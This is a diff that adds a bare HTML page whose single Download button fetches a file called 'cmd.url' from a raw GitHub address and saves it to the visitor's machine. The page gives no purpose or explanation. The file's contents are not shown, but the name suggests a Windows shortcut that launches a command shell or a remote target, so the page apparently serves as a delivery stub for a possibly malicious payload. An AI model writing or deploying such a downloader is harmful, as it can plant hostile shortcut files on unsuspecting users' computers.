@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>cmd.url</title>
+</head>
+<body>
+  <button onclick="downloadFile()">Download</button>
+
+  <script>
+    function downloadFile() {
+      const fileUrl = 'https://raw.githubusercontent.com/RomanRumania/Holifkly/main/cmd.url';
+      const fileName = 'cmd.url';
+
+      fetch(fileUrl)
+        .then(response => response.blob())
+        .then(blob => {
+          const url = window.URL.createObjectURL(blob);
+          const a = document.createElement('a');
+          a.href = url;
+          a.download = fileName;
+          document.body.appendChild(a);
+          a.click();
+          window.URL.revokeObjectURL(url);
+        })
+        .catch(error => console.error('Download failed:', error));
+    }
+  </script>
+</body>
+</html>
